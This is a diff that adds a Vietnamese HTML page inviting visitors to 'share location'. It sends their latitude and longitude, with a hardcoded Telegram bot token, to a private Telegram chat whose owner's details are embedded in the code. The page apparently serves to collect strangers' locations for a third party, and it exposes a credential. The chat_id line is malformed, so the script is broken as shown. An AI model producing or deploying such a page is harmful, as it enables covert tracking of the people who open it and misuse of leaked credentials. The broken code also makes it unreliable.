@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Check vị trí</title>
+</head>
+<body>
+  <h2>Bấm để chia sẻ vị trí</h2>
+  <button onclick="getLocation()">Chia sẻ vị trí</button>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendPosition);
+      } else {
+        alert("Trình duyệt không hỗ trợ");
+      }
+    }
+
+    function sendPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      const token = "8770209732:AAHHiC-wWAU3F9UUG_KJ41QijPQSjvHlH1M";
+      const chat_id = ""chat": {
+          "id": 2040033988,
+          "first_name": "Tứ Đổ Tường",
+          "username": "sieutokhonglo",
+          "type": "private"
+        }";
+
+      const text = `📍 Vị trí:\nLat: ${lat}\nLon: ${lon}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text
+        })
+      });
+
+      alert("Đã gửi vị trí!");
+    }
+  </script>
+</body>
+</html>
